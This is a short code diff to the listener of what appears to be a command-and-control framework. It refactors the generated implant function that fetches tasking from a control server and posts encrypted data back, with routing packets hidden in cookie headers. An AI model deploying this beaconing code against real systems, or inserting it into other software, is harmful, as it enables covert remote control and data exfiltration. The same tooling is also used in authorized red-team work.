@@ -918,7 +918,7 @@ class Listener(object):
 
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
-                sendMessage = """
+                sendMessage = f"""
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
@@ -930,9 +930,8 @@ def send_message(packets=None):
     global taskURIs
     data = None
     if packets:
-        data = ''.join(packets.decode('latin-1'))
         # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
+        encData = aes_encrypt_then_hmac(key, packets)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
 
     else:
@@ -940,7 +939,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-        headers['Cookie'] = \"""" + self.session_cookie + """session=%s" % (b64routingPacket)
+        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
 
